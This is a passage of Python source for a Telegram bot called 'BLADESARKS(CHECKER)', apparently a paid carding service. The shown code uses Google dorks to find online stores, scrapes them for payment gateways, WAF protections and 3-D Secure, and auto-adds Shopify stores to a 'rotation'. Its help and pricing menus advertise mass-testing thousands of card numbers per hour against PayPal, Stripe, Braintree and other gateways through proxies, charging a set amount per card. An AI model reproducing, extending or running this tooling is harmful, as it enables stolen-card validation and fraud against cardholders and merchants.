    '"{keyword}" "secure checkout"',
    '"{keyword}" "order now"',
    '"{keyword}" "price" "add to cart"',
    '"{keyword}" "sale" "buy now"',
    'intitle:"{keyword}" "shop"',
    'intitle:"{keyword}" "store"',
    '"{keyword}" "powered by shopify"',
    '"{keyword}" "woocommerce"',
    '"{keyword}" "magento"'
]

GENERAL_DORK_TEMPLATES = [
    'intitle:"{keyword}"',
    'inurl:"{keyword}"',
    'intext:"{keyword}"',
    '"{keyword}"'
]

PLATFORM_PATTERNS = {
    'shopify': {
        'patterns': [
            r'myshopify\.com',
            r'cdn\.shopify\.com',
            r'shopify\.com',
            r'Shopify\.pay',
            r'powered by shopify',
            r'shopify\.[a-z]{2,}',
            r'Shopify\.App',
            r'__st\s*=',
            r'var Shopify = Shopify',
            r'shopify\.js'
        ],
        'headers': {
            'x-shopid': 'Shopify',
            'x-shopify-stage': 'Shopify'
        }
    },
    'woocommerce': {
        'patterns': [
            r'wp-content/plugins/woocommerce',
            r'woocommerce',
            r'WooCommerce',
            r'woocommerce\.js',
            r'woocommerce\.css',
            r'wc\-',
            r'<html class="no-js woocommerce'
        ],
        'headers': {}
    },
    'magento': {
        'patterns': [
            r'magento',
            r'Magento',
            r'static/version',
            r'requirejs',
            r'js/mage',
            r'X-Magento',
            r'mage\\.'
        ],
        'headers': {
            'x-magento': 'Magento'
        }
    }
}

PAYMENT_PATTERNS = {
    'stripe': {
        'patterns': [
            r'stripe\.com',
            r'stripe\.js',
            r'pk_live_',
            r'pk_test_',
            r'Stripe\.',
            r'data-stripe'
        ],
        'risk': 'Low'
    },
    'paypal': {
        'patterns': [
            r'paypal\.com',
            r'paypalobjects\.com',
            r'PayPal\.',
            r'xclick',
            r'paypal-button',
            r'pp-'
        ],
        'risk': 'Low'
    },
    'braintree': {
        'patterns': [
            r'braintree',
            r'Braintree',
            r'braintree\.js',
            r'client_token'
        ],
        'risk': 'Medium'
    }
}

PROTECTION_PATTERNS = {
    'cloudflare': {
        'patterns': [
            r'cloudflare',
            r'__cfduid',
            r'cf-ray',
            r'cf-browser-verification'
        ],
        'type': 'WAF'
    },
    'incapsula': {
        'patterns': [
            r'incapsula',
            r'visid_incap',
            r'incap_ses'
        ],
        'type': 'WAF'
    }
}

THREEDS_PATTERNS = [
    r'3d secure',
    r'3dsecure',
    r'three d secure',
    r'verified by visa',
    r'mastercard securecode',
    r'american express safeKey',
    r'j/safekey',
    r'3ds',
    r'threeds',
    r'payerAuthentication'
]

class SmartDorkEngine:
    def __init__(self):
        self.session = None
        self.results_cache = {}
        
    async def get_session(self):
        if not self.session:
            self.session = aiohttp.ClientSession()
        return self.session
    
    def detect_shopping_intent(self, keyword: str) -> bool:
        keyword_lower = keyword.lower()
        for intent in SHOPPING_INTENT_KEYWORDS:
            if intent in keyword_lower:
                return True
        return False
    
    def generate_smart_dorks(self, keyword: str) -> List[str]:
        dorks = []
        is_shopping = self.detect_shopping_intent(keyword)
        
        if is_shopping:
            templates = SHOPPING_DORK_TEMPLATES
            print(f"🛒 Shopping intent detected - using e-commerce dorks")
        else:
            templates = SHOPPING_DORK_TEMPLATES.copy()
            for template in GENERAL_DORK_TEMPLATES:
                dorks.append(template.format(keyword=keyword))
        
        for template in templates:
            dorks.append(template.format(keyword=keyword))
        
        return list(set(dorks))
    
    async def search_google(self, dork: str, pages: int = 2) -> List[str]:
        urls = []
        session = await self.get_session()
        headers = {'User-Agent': random.choice(USER_AGENTS)}
        
        for page in range(pages):
            start = page * 10
            search_url = f"https://www.google.com/search?q={urllib.parse.quote(dork)}&start={start}"
            
            try:
                async with session.get(search_url, headers=headers, timeout=15) as response:
                    if response.status == 200:
                        html = await response.text()
                        soup = BeautifulSoup(html, 'html.parser')
                        
                        for link in soup.find_all('a'):
                            href = link.get('href', '')
                            if '/url?q=' in href:
                                url = href.split('/url?q=')[1].split('&')[0]
                                if url.startswith('http') and not any(x in url for x in ['google.com', 'youtube.com']):
                                    urls.append(url)
            except Exception as e:
                print(f"⚠️ Google search error: {e}")
            
            await asyncio.sleep(random.uniform(2, 4))
        
        return urls
    
    async def extract_domain(self, url: str) -> str:
        try:
            parsed = urllib.parse.urlparse(url)
            domain = parsed.netloc.lower()
            if domain.startswith('www.'):
                domain = domain[4:]
            return domain
        except:
            return None
    
    def is_likely_ecommerce(self, html: str, title: str) -> bool:
        html_lower = html.lower()
        strong_indicators = [
            'add to cart', 'add to basket', 'buy now',
            'shopping cart', 'checkout', 'proceed to checkout',
            'my account', 'wishlist', 'product page',
            'products', 'collections', 'shop now'
        ]
        
        for indicator in strong_indicators:
            if indicator in html_lower:
                return True
        
        platforms = ['shopify', 'woocommerce', 'magento', 'bigcommerce']
        for platform in platforms:
            if platform in html_lower:
                return True
        
        return False
    
    async def fetch_site_info(self, domain: str, keyword: str) -> Dict:
        try:
            session = await self.get_session()
            url = f"https://{domain}"
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            
            start_time = time.time()
            async with session.get(url, headers=headers, timeout=15, allow_redirects=True, ssl=False) as response:
                load_time = time.time() - start_time
                response_headers = dict(response.headers)
                html = await response.text()
                
                soup = BeautifulSoup(html, 'html.parser')
                title_tag = soup.find('title')
                title = title_tag.text.strip() if title_tag else ''
                
                is_ecommerce = self.is_likely_ecommerce(html, title)
                has_keyword = keyword.lower() in html.lower() or keyword.lower() in title.lower()
                
                result = {
                    'domain': domain,
                    'url': url,
                    'status_code': response.status,
                    'load_time': round(load_time, 2),
                    'platform': 'unknown',
                    'payment_gateways': [],
                    'protections': [],
                    'has_3d_secure': False,
                    'has_checkout': False,
                    'is_ecommerce': is_ecommerce,
                    'has_keyword': has_keyword,
                    'relevance_score': 0,
                    'title': title[:200]
                }
                
                meta_desc = soup.find('meta', attrs={'name': 'description'})
                if meta_desc:
                    result['meta_description'] = meta_desc.get('content', '')[:200]
                
                # Detect platform
                for platform, patterns in PLATFORM_PATTERNS.items():
                    for pattern in patterns['patterns']:
                        if re.search(pattern, html, re.IGNORECASE):
                            result['platform'] = platform
                            break
                
                # Detect payment gateways
                for gateway, info in PAYMENT_PATTERNS.items():
                    for pattern in info['patterns']:
                        if re.search(pattern, html, re.IGNORECASE):
                            result['payment_gateways'].append({
                                'name': gateway,
                                'risk': info['risk']
                            })
                            break
                
                # Detect checkout
                checkout_indicators = ['checkout', 'cart', 'buy now', 'purchase', 'order now']
                for indicator in checkout_indicators:
                    if indicator in html.lower():
                        result['has_checkout'] = True
                        break
                
                # Calculate relevance score
                score = 0
                if is_ecommerce:
                    score += 20
                if result['has_checkout']:
                    score += 20
                score += min(len(result['payment_gateways']) * 10, 30)
                if has_keyword:
                    score += 10
                if 'product' in html.lower():
                    score += 10
                if 'add to cart' in html.lower():
                    score += 10
                
                result['relevance_score'] = min(score, 100)
                return result
                
        except Exception as e:
            return {
                'domain': domain,
                'url': f"https://{domain}",
                'status': 'error',
                'error': str(e)[:100],
                'platform': 'unknown',
                'relevance_score': 0
            }
    
    async def close(self):
        if self.session:
            await self.session.close()
            self.session = None

async def dork_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Smart dork search - finds shopping sites selling your keyword"""
    user_id = update.effective_user.id
    user = update.effective_user
    
    if not await verify_group_access(update, context):
        return
    
    if not context.args:
        await update.message.reply_text(
            "🔍 <b>Smart Dork Search Engine</b>\n\n"
            "Usage: <code>/dork &lt;product&gt;</code>\n\n"
            "Examples:\n"
            "<code>/dork bra</code> - Find stores selling bras\n"
            "<code>/dork nike shoes</code> - Find Nike shoe stores\n"
            "<code>/dork vintage dress</code> - Find vintage dress shops\n\n"
            "<b>What it does:</b>\n"
            "• Automatically detects if you want SHOPPING sites\n"
            "• Searches for stores selling your product\n"
            "• Analyzes payment gateways and protections\n"
            "• Auto-adds Shopify stores to rotation\n"
            "• Ranks sites by relevance score",
            parse_mode=ParseMode.HTML
        )
        return
    
    keyword = " ".join(context.args).strip()
    
    if user_id in autosopi_active_tasks:
        await update.message.reply_text("⚠️ You have an active Autosopi session. Please stop it first with /stop")
        return
    
    status_msg = await update.message.reply_text(
        f"🔍 <b>Smart Dork Search</b>\n\n"
        f"Product: <code>{keyword}</code>\n"
        f"Detecting shopping intent...",
        parse_mode=ParseMode.HTML
    )
    
    dork_engine = SmartDorkEngine()
    
    try:
        is_shopping = dork_engine.detect_shopping_intent(keyword)
        dorks = dork_engine.generate_smart_dorks(keyword)
        
        intent_msg = "🛒 Shopping intent detected - finding stores" if is_shopping else "🔍 Looking for stores selling your product"
        
        await status_msg.edit_text(
            f"🔍 <b>Smart Dork Search</b>\n\n"
            f"Product: <code>{keyword}</code>\n"
            f"{intent_msg}\n"
            f"Search patterns: {len(dorks)}\n"
            f"Searching multiple engines...",
            parse_mode=ParseMode.HTML
        )
        
        all_urls = []
        search_engines = [
            ('Google', dork_engine.search_google)
        ]
        
        for engine_name, search_func in search_engines:
            for i, dork in enumerate(dorks[:5]):
                await status_msg.edit_text(
                    f"🔍 <b>Searching</b>\n\n"
                    f"Product: <code>{keyword}</code>\n"
                    f"Engine: {engine_name}\n"
                    f"Progress: {i+1}/5 dorks\n"
                    f"URLs found: {len(all_urls)}",
                    parse_mode=ParseMode.HTML
                )
                
                urls = await search_func(dork, pages=1)
                all_urls.extend(urls)
                await asyncio.sleep(1)
        
        domains = set()
        for url in all_urls:
            domain = await dork_engine.extract_domain(url)
            if domain and not any(x in domain for x in ['google.com', 'bing.com', 'youtube.com', 'facebook.com', 'wikipedia.org']):
                domains.add(domain)
        
        domains = list(domains)[:20]
        
        if not domains:
            await status_msg.edit_text(
                f"❌ <b>No stores found</b>\n\n"
                f"Product: <code>{keyword}</code>\n"
                f"Try a different product or try again later.",
                parse_mode=ParseMode.HTML,
                reply_markup=back_menu()
            )
            return
        
        await status_msg.edit_text(
            f"✅ <b>Found {len(domains)} potential stores</b>\n\n"
            f"Now analyzing each store...\n"
            f"This may take a few minutes.",
            parse_mode=ParseMode.HTML
        )
        
        results = []
        shopify_sites = []
        
        for i, domain in enumerate(domains, 1):
            await status_msg.edit_text(
                f"🔍 <b>Analyzing stores</b>\n\n"
                f"Product: <code>{keyword}</code>\n"
                f"Progress: {i}/{len(domains)}\n"
                f"Current: {domain}",
                parse_mode=ParseMode.HTML
            )
            
            analysis = await dork_engine.fetch_site_info(domain, keyword)
            results.append(analysis)
            
            if analysis.get('platform') == 'shopify' and analysis.get('status_code') == 200:
                shopify_sites.append(domain)
                
                site_normalized = autosopi_site_manager.normalize_site_url(domain)
                if site_normalized not in autosopi_site_manager.sites:
                    user_name = user.first_name
                    if user.username:
                        user_name += f" (@{user.username})"
                    
                    success, msg = autosopi_site_manager.add_site(
                        domain,
                        user_id,
                        user_name,
                        bypass_pending=True
                    )
                    if success:
                        user_manager.increment_sites_added(user_id)
                        print(f"✅ Auto-added Shopify store: {domain}")
            
            await asyncio.sleep(1)
        
        results.sort(key=lambda x: x.get('relevance_score', 0), reverse=True)
        
        report = f"📊 <b>Smart Dork Results: '{keyword}'</b>\n\n"
        report += f"━━━━━━━━━━━━━━━━━━━\n"
        report += f"📈 <b>Statistics:</b>\n"
        report += f"• Stores analyzed: {len(results)}\n"
        report += f"• Shopify stores: {len(shopify_sites)} (auto-added)\n"
        report += f"━━━━━━━━━━━━━━━━━━━\n\n"
        report += f"<b>🛍️ Top Stores:</b>\n\n"
        
        for r in results[:5]:
            if r.get('status_code') != 200:
                continue
            score = r.get('relevance_score', 0)
            platform_emoji = '🛒' if r.get('platform') == 'shopify' else '🌐'
            gateways = ', '.join([g['name'] for g in r.get('payment_gateways', [])[:2]]) or 'None'
            
            report += f"{platform_emoji} <b>{r['domain']}</b> [Score: {score}]\n"
            report += f"   💳 {gateways}\n"
        
        await status_msg.edit_text(
            report,
            parse_mode=ParseMode.HTML,
            reply_markup=back_menu()
        )
        
    except Exception as e:
        await status_msg.edit_text(
            f"❌ <b>Error during dork search</b>\n\n{str(e)[:200]}",
            parse_mode=ParseMode.HTML,
            reply_markup=back_menu()
        )
        print(f"❌ Dork error: {traceback.format_exc()}")
    finally:
        await dork_engine.close()

# --- COMMAND HANDLERS ---

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_manager.update_user_info(user.id, user.username or "NoUsername", user.first_name)
    stats = user_manager.get_user_stats(user.id)
    
    if not await check_group_membership(update, context):
        return
    
    amount = context.user_data.get('payment_amount', DEFAULT_AMOUNT)
    gateway = context.user_data.get('gateway', 'paypal')
    tier = stats['tier']
    speed = TIER_SPEEDS.get(tier, 900)
    concurrency = TIER_CONCURRENCY.get(tier, 1)
    
    gateway_display = {
        'paypal': 'PayPal',
        'shopify': 'Shopify',
        'razorpay': 'Razorpay',
        'stripe_charge': 'Stripe Charge',
        'stripe_auth': 'Stripe Auth',
        'braintree': 'Braintree',
        'autosopi': 'Autosopi',
        'payflow': 'Payflow'
    }.get(gateway, 'PayPal')
    
    # Calculate monthly users (you can make this dynamic)
    monthly_users = 933
    
    # Get join date from user stats
    joined_date = stats.get('joined', datetime.now().strftime("%d/%m/%y"))
    if isinstance(joined_date, str):
        try:
            # Try to parse and reformat if needed
            joined_date = datetime.strptime(joined_date, "%Y-%m-%d").strftime("%d/%m/%y")
        except:
            pass
    
    # Create the caption text (what will appear below the image)
    caption = (
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"<b>BLADESARKS(CHECKER)</b>\n"
        f"★ Status : Active ✔\n\n"
        f"★ ID ✉️ <code>{user.id}</code>\n"
        f"★ User ✉️ {user.username or 'None'}\n"
        f"★ Name ✉️ {user.first_name} [{tier.upper()}]\n"
        f"@Cypher099\n"
    )
    
    # Send photo with caption and buttons
    try:
        # Try to open and send the image file
        with open('p1.jpg', 'rb') as photo:  # or 'start_image.png'
            await update.message.reply_photo(
                photo=photo,
                caption=caption,
                parse_mode=ParseMode.HTML,
                reply_markup=start_menu()
            )
    except FileNotFoundError:
        # If image file not found, send text only
        await update.message.reply_text(
            caption + "\n\n⚠️ Image not loaded",
            parse_mode=ParseMode.HTML,
            reply_markup=start_menu()
        )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await verify_group_access(update, context):
        return
        
    await update.message.reply_text(
        "📚 <b>Help Menu - Ultra Multi-User v3.0</b>\n\n"
        "<b>📋 Card Format:</b>\n"
        "Accepts ANY format automatically:\n"
        "<code>4000000000000002|12|2025|123</code>\n"
        "<code>4000000000000002 12 2025 123</code>\n"
        "<code>4000000000000002,12,2025,123</code>\n\n"
        "<b>⚡ Speed Tiers:</b>\n"
        "• Free: 2000 cards/hour (10 parallel)\n"
        "• Premium: 10,000 cards/hour (50 parallel)\n"
        "• Ultimate: 20,000 cards/hour (100 parallel)\n"
        "• Admin: 50,000 cards/hour (200 parallel)\n\n"
        "<b>👥 Multi-User Support:</b>\n"
        "• Up to 2000 users can use the bot simultaneously\n"
        "• Independent speed control per user\n"
        "• Fair queuing system\n"
        "• No blocking between users\n\n"
        "<b>💳 Gateways:</b>\n"
        "• PayPal (POST only, full debug)\n"
        "• Stripe Charge\n"
        "• Stripe Auth\n"
        "• Payflow (with proxy)\n"
        "• Autosopi (site rotation)\n"
        "• Shopify\n"
        "• Razorpay\n"
        "• Braintree\n\n"
        "<b>🔧 Commands:</b>\n"
        "/start - Start bot\n"
        "/help - Show this help\n"
        "/id - Show your ID\n"
        "/stop - Stop current session\n"
        "/stats - Statistics\n"
        "/status - System status\n"
        "/tier - View your tier\n"
        "/dork - Smart store search\n"
        "/proxy - Proxy manager\n"
        "/leaderboard - Top users\n"
        "/recover - Recover sessions\n\n"
        "<b>💳 Single Check:</b>\n"
        "/ppc - PayPal\n"
        "/auc - Autosopi\n"
        "/stc - Stripe Charge\n"
        "/chk - Stripe Auth\n"
        "/pfc - Payflow\n\n"
        "<b>📦 Mass Check:</b>\n"
        "/ppmc - PayPal mass\n"
        "/aumc - Autosopi mass",
        parse_mode=ParseMode.HTML
    )

async def id_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await verify_group_access(update, context):
        return
        
    user = update.effective_user
    await update.message.reply_text(
        f"🆔 <b>Your Information</b>\n\n"
        f"User ID: <code>{user.id}</code>\n"
        f"Username: @{user.username or 'N/A'}\n"
        f"First Name: {user.first_name}\n"
        f"👑 Owner: {'✅ Yes' if user.id == OWNER_ID else '❌ No'}",
        parse_mode=ParseMode.HTML
    )

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop current session for the user"""
    u_id = update.effective_user.id
    stopped = False
    
    # Stop mass check if running
    if u_id in running_mass_checks:
        running_mass_checks.pop(u_id, None)
        stopped = True
    
    # Stop from active tasks
    task_dicts = [
        paypal_active_tasks,
        shopify_active_tasks,
        razorpay_active_tasks,
        stripe_charge_active_tasks,
        stripe_auth_active_tasks,
        braintree_active_tasks,
        autosopi_active_tasks,
        payflow_active_tasks
    ]
    
    for task_dict in task_dicts:
        if u_id in task_dict:
            task_dict.pop(u_id, None)
            stopped = True
    
    if stopped:
        await update.message.reply_text("🛑 <b>Session stopped successfully!</b>", parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text("❌ No active session found.", parse_mode=ParseMode.HTML)
async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await verify_group_access(update, context):
        return
        
    global checked_count, approved_count
    success_rate = (approved_count/checked_count)*100 if checked_count > 0 else 0
    amount = context.user_data.get('payment_amount', DEFAULT_AMOUNT)
    total_volume = approved_count * float(amount)
    
    stats = (
        f"📊 <b>Global Statistics</b>\n\n"
        f"✅ Approved: {approved_count}\n"
        f"❌ Declined: {checked_count - approved_count}\n"
        f"📝 Total: {checked_count}\n"
        f"💰 Volume: ${total_volume:.2f}\n"
        f"📈 Rate: {round(success_rate, 1)}%\n"
        f"🔄 Active Sessions: {len(paypal_active_tasks) + len(shopify_active_tasks) + len(razorpay_active_tasks) + len(stripe_charge_active_tasks) + len(stripe_auth_active_tasks) + len(braintree_active_tasks) + len(autosopi_active_tasks) + len(payflow_active_tasks)}"
    )
    
    await update.message.reply_text(stats, parse_mode=ParseMode.HTML)

async def price_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show pricing information for all tiers"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    current_tier = user_manager.get_tier(user_id)
    
    msg = "💰 <b>Pricing Information</b>\n\n"
    
    for tier, info in user_manager.TIERS.items():
        if tier == "admin" and update.effective_user.id != OWNER_ID:
            continue
            
        if tier == current_tier:
            current_indicator = "✅ <b>YOUR CURRENT TIER</b>\n"
        else:
            current_indicator = ""
            
        msg += f"{info['emoji']} <b>{tier.upper()}</b>\n"
        if current_indicator:
            msg += current_indicator
        msg += f"   💵 Price: {info['price']}\n"
        msg += f"   📊 Daily: {info['max_checks_per_day'] if info['max_checks_per_day'] != float('inf') else '∞'}\n"
        msg += f"   📦 Batch: {info['max_batch_size']}\n"
        msg += f"   ⏱️ Rate: {info['rate_limit']}s\n"
        msg += f"   ⚡ Speed: {TIER_SPEEDS.get(tier, 900)} cards/hour\n"
        msg += f"   🔀 Concurrency: {info['concurrency']}\n"
        msg += f"   🌐 Gateways: {', '.join(info['can_access_gateways'])}\n\n"
    
    msg += "━━━━━━━━━━━━━━━━━━━\n"
    msg += "💳 <b>Payment Methods:</b>\n"
    msg += "• Redeem keys with /redeem\n"
    msg += "• Contact @Cypher099 for purchasing\n"
    msg += "━━━━━━━━━━━━━━━━━━━\n"
    
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())

# --- CALLBACK HANDLER ---
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = update.effective_user.id
    
    # Try to answer the callback query, but don't fail if it's expired
    try:
        await query.answer()
    except Exception as e:
        print(f"⚠️ Could not answer callback query (may be expired): {e}")
        # Continue processing even if we can't answer the query
    
    user_manager.update_user_info(user_id, update.effective_user.username or "NoUsername", update.effective_user.first_name)
    
    if not query.data.startswith('group_') and not await check_group_membership(update, context):
        return
    
    try:
        if query.data.startswith('stop_'):
            u_id = int(query.data.split('_')[1])
            stopped = False
            if u_id in paypal_active_tasks:
                paypal_active_tasks.pop(u_id, None)
                stopped = True
            if u_id in shopify_active_tasks:
                shopify_active_tasks.pop(u_id, None)
                stopped = True
            if u_id in razorpay_active_tasks:
                razorpay_active_tasks.pop(u_id, None)
                stopped = True
            if u_id in stripe_charge_active_tasks:
                stripe_charge_active_tasks.pop(u_id, None)
                stopped = True
            if u_id in stripe_auth_active_tasks:
                stripe_auth_active_tasks.pop(u_id, None)
                stopped = True
            if u_id in braintree_active_tasks:
                braintree_active_tasks.pop(u_id, None)
                stopped = True
            if u_id in autosopi_active_tasks:
                autosopi_active_tasks.pop(u_id, None)
                stopped = True
            if u_id in payflow_active_tasks:
                payflow_active_tasks.pop(u_id, None)
                stopped = True
            try:
                await query.edit_message_caption(
                    caption="🛑 <b>Session Stopped</b>",
                    parse_mode=ParseMode.HTML,
                    reply_markup=back_menu()
                )
            except Exception as e:
                print(f"⚠️ Could not edit message: {e}")
        
        elif query.data == 'my_stats':
            stats = user_manager.get_user_stats(user_id)
            msg = f"{stats['emoji']} <b>Your Statistics</b>\n\n"
            msg += f"🎯 Tier: {stats['tier'].upper()}{stats['expiry_text']}\n"
            msg += f"💰 Price: {stats['price']}\n"
            msg += f"━━━━━━━━━━━━━━━━━━━\n"
            msg += f"📊 Total Checks: {stats['total_checks']}\n"
            msg += f"🎯 Total Hits: {stats['total_hits']}\n"
            msg += f"📈 Today: {stats['daily_checks']}/{stats['daily_limit'] if stats['daily_limit'] != float('inf') else '∞'}\n"
            msg += f"📦 Max Batch: {stats['batch_limit']}\n"
            msg += f"🔀 Concurrency: {stats['concurrency']}\n"
            msg += f"⏱️ Rate Limit: {stats['rate_limit']}s\n"
            msg += f"🔄 Proxy: {'✅' if stats['proxy_allowed'] else '❌'}\n"
            msg += f"📌 Sites Added: {stats['sites_added']}\n"
            msg += f"📅 Joined: {stats['joined']}\n"
            try:
                await query.edit_message_caption(
                    caption=msg,
                    parse_mode=ParseMode.HTML,
                    reply_markup=back_menu()
                )
            except Exception as e:
                print(f"⚠️ Could not edit message: {e}")
        
        elif query.data == 'proxy_stats':
            stats = proxy_manager.get_stats()
            msg = f"📊 <b>Proxy Statistics</b>\n\n"
            msg += f"Total: {stats['total']}\n"
            msg += f"✅ Working: {stats['working']}\n"
            msg += f"❌ Failed: {stats['failed']}\n"
            msg += f"💀 Dead: {stats['dead']}\n"
            msg += f"📈 Avg Success: {stats['avg_success_rate']:.1f}%\n"
            msg += f"🏆 Best: {stats['best_proxy']} ({stats['best_rate']:.1f}%)\n"
            msg += f"⏱️ Last Test: {stats['last_test']}\n"
            try:
                await query.edit_message_caption(
                    caption=msg,
                    parse_mode=ParseMode.HTML,
                    reply_markup=back_menu()
                )
            except Exception as e:
                print(f"⚠️ Could not edit message: {e}")
        
        elif query.data == 'proxy_test':
            if not user_manager.can_use_proxy(user_id):
                try:
                    await query.edit_message_caption(
                        caption="❌ Your tier doesn't support proxy usage.",
                        parse_mode=ParseMode.HTML,
                        reply_markup=back_menu()
                    )
                except Exception as e:
                    print(f"⚠️ Could not edit message: {e}")
                return
            try:
                await query.edit_message_caption(
                    caption="🧪 Testing proxies...",
                    parse_mode=ParseMode.HTML
                )
            except Exception as e:
                print(f"⚠️ Could not edit message: {e}")
            asyncio.create_task(test_proxies(update, context))
        
        elif query.data == 'proxy_clear':
            if not user_manager.can_use_proxy(user_id):
                try:
                    await query.edit_message_caption(
                        caption="❌ Your tier doesn't support proxy usage.",
                        parse_mode=ParseMode.HTML,
                        reply_markup=back_menu()
                    )
                except Exception as e:
                    print(f"⚠️ Could not edit message: {e}")
                return
            proxy_manager.clear_proxies()
            try:
                await query.edit_message_caption(
                    caption="🗑️ All proxies cleared",
                    parse_mode=ParseMode.HTML,
                    reply_markup=back_menu()
                )
            except Exception as e:
                print(f"⚠️ Could not edit message: {e}")
        
        elif query.data == 'proxy_reset':
            if not user_manager.can_use_proxy(user_id):
                try:
                    await query.edit_message_caption(
                        caption="❌ Your tier doesn't support proxy usage.",
                        parse_mode=ParseMode.HTML,
                        reply_markup=back_menu()
                    )
                except Exception as e:
                    print(f"⚠️ Could not edit message: {e}")
                return
            proxy_manager.reset_failed()
            try:
                await query.edit_message_caption(
                    caption="🔄 Failed proxies list reset",
                    parse_mode=ParseMode.HTML,
                    reply_markup=back_menu()
                )
            except Exception as e:
                print(f"⚠️ Could not edit message: {e}")
        
        elif query.data == 'proxy_load':
            if not user_manager.can_use_proxy(user_id):
                try:
                    await query.edit_message_caption(
                        caption="❌ Your tier doesn't support proxy usage.",
                        parse_mode=ParseMode.HTML,
                        reply_markup=back_menu()
                    )
                except Exception as e:
                    print(f"⚠️ Could not edit message: {e}")
                return
            try:
                await query.edit_message_caption(
                    caption="📥 Send a proxies.txt file",
                    parse_mode=ParseMode.HTML
                )
            except Exception as e:
                print(f"⚠️ Could not edit message: {e}")
        
        elif query.data == 'proxy_add':
            if not user_manager.can_use_proxy(user_id):
                try:
                    await query.edit_message_caption(
                        caption="❌ Your tier doesn't support proxy usage.",
                        parse_mode=ParseMode.HTML,
                        reply_markup=back_menu()
                    )
                except Exception as e:
                    print(f"⚠️ Could not edit message: {e}")
                return
            context.user_data['waiting_for_proxy'] = True
            try:
                await query.edit_message_caption(
                    caption="➕ <b>Add Proxy Manually</b>\n\n"
                            "Send proxy in format:\n"
                            "<code>ip:port</code>\n"
                            "<code>user:pass@ip:port</code>\n"
                            "<code>user:pass:ip:port</code>\n"
                            "<code>ip:port:user:pass</code>\n"
                            "<code>http://590746384137043:2weeks@219.100.37.85:2894314</code>\n\n"
                            "All formats supported!",
                    parse_mode=ParseMode.HTML
                )
            except Exception as e:
                print(f"⚠️ Could not edit message: {e}")
        
        elif query.data == 'proxy_list':
            if not user_manager.can_use_proxy(user_id):
                try:
                    await query.edit_message_caption(
                        caption="❌ Your tier doesn't support proxy usage.",
                        parse_mode=ParseMode.HTML,
                        reply_markup=back_menu()
                    )
                except Exception as e:
                    print(f"⚠️ Could not edit message: {e}")
                return
            proxies = proxy_manager.proxies
            if not proxies:
                try:
                    await query.edit_message_caption(
                        caption="📋 No proxies loaded.",
                        parse_mode=ParseMode.HTML,
                        reply_markup=back_menu()
                    )
                except Exception as e:
                    print(f"⚠️ Could not edit message: {e}")
                return
            
            msg = "📋 <b>Proxy List</b>\n\n"
            for i, p in enumerate(proxies[:20], 1):
                status = "✅" if p not in proxy_manager.failed_proxies else "❌"
                stats = proxy_manager.proxy_stats.get(p, {})
                rate = stats.get('success_rate', 0) * 100
                msg += f"{i}. {status} {mask_proxy(p)} ({rate:.0f}%)\n"
            
            if len(proxies) > 20:
                msg += f"\n... and {len(proxies)-20} more"
            
            try:
                await query.edit_message_caption(
                    caption=msg,
                    parse_mode=ParseMode.HTML,
                    reply_markup=back_menu()
                )
            except Exception as e:
                print(f"⚠️ Could not edit message: {e}")
        
        elif query.data.startswith('amount_'):
            if query.data == 'amount_custom':
                context.user_data['waiting_for_amount'] = True
                try:
                    await query.edit_message_caption(
                        caption="💰 <b>Enter Custom Amount</b>\n\n"
                                "Send the amount as a number:\n"
                                "Examples: <code>5.99</code>, <code>25.00</code>, <code>100</code>\n\n"
                                "<i>Minimum: $0.50, Maximum: $1000</i>",
                        parse_mode=ParseMode.HTML
                    )
                except Exception as e:
                    print(f"⚠️ Could not edit message: {e}")
            else:
                amount = query.data.replace('amount_', '')
                context.user_data['payment_amount'] = amount
                try:
                    await query.edit_message_caption(
                        caption=f"✅ <b>Amount set to: ${amount}</b>\n\n"
                                f"All payments will now attempt to charge ${amount} per card.",
                        parse_mode=ParseMode.HTML,
                        reply_markup=back_menu()
                    )
                except Exception as e:
                    print(f"⚠️ Could not edit message: {e}")
        
        elif query.data == 'set_amount':
            try:
                await query.edit_message_caption(
                    caption="💰 <b>Select Payment Amount</b>\n\n"
                            "Choose how much to charge per card:",
                    parse_mode=ParseMode.HTML,
                    reply_markup=amount_menu()
                )
            except Exception as e:
                print(f"⚠️ Could not edit message: {e}")
        
        elif query.data == 'gateway_menu':
            try:
                await query.edit_message_caption(
                    caption="🌐 <b>Select Gateway</b>\n\n"
                            "Choose which payment gateway to use:",
                    parse_mode=ParseMode.HTML,
                    reply_markup=gateway_menu()
                )
            except Exception as e:
                print(f"⚠️ Could not edit message: {e}")
        
        elif query.data == 'price_menu':
            try:
                await query.edit_message_caption(
                    caption="💰 <b>Pricing Plans</b>\n\n"
                            "<b>🆓 FREE TIER</b>\n"
                            "• 2,000 cards/hour\n"
                            "• 10 parallel checks\n"
                            "• Basic gateways\n"
                            "• Price: $0\n\n"
                            "<b>💎 PREMIUM TIER</b>\n"
                            "• 10,000 cards/hour\n"
                            "• 50 parallel checks\n"
                            "• All gateways\n"
                            "• Direct site addition\n"
                            "• Price: $20/month\n\n"
                            "<b>👑 ULTIMATE TIER</b>\n"
                            "• 20,000 cards/hour\n"
                            "• 100 parallel checks\n"
                            "• All gateways + Dork\n"
                            "• Priority support\n"
                            "• Price: $30/month\n\n"
                            "Contact @unruly_yut to purchase",
                    parse_mode=ParseMode.HTML,
                    reply_markup=back_menu()
                )
            except Exception as e:
                print(f"⚠️ Could not edit message: {e}")
        
        elif query.data == 'gateway_paypal':
            context.user_data['gateway'] = 'paypal'
            try:
                await query.edit_message_caption(
                    caption="✅ <b>Gateway set to: PayPal</b>\n\n"
                            "This will use the Render endpoint (POST only).\n\n"
                            "<b>Commands:</b>\n"
                            "/ppc &lt;card&gt; - Single check\n"
                            "/ppmc &lt;cards&gt; - Mass check",
                    parse_mode=ParseMode.HTML,
                    reply_markup=back_menu()
                )
            except Exception as e:
